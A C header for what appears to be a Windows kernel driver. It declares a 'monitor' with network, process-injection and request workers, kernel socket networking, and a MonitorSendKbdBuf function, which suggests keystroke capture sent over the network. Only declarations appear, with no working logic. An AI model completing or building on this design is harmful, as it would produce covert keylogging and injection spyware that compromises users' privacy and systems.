#pragma once

#include <inc/drvmain.h>

#include <inc/sysworker.h>
#include <inc/mwsk.h>
#include <inc/keybrd.h>
#include <inc/inject.h>
#include <inc/thash.h>
#include <inc/pallocator.h>

#include <h/drvioctl.h>

#define MONITOR_STATE_STOPPED 1
#define MONITOR_STATE_STARTED 2

typedef struct _MONITOR {
	SYSWORKER		NetWorker;
	SYSWORKER		InjectWorker;
	SYSWORKER		RequestWorker;
	PMWSK_CONTEXT   WskContext;
	volatile LONG	State;
	KGUARDED_MUTEX	Mutex;
	THASH			ProcessTable;
} MONITOR, *PMONITOR;

VOID
	MonitorInit();

NTSTATUS
    MonitorStart();

NTSTATUS
    MonitorStop();

NTSTATUS
	MonitorOpenWinsta(POPEN_WINSTA Winsta);

NTSTATUS
	MonitorOpenDesktop(POPEN_DESKTOP openDesktop);

VOID MonitorSendKbdBuf(PMONITOR Monitor, PVOID BuffEntry);


PMONITOR
	MonitorGetInstance(VOID);
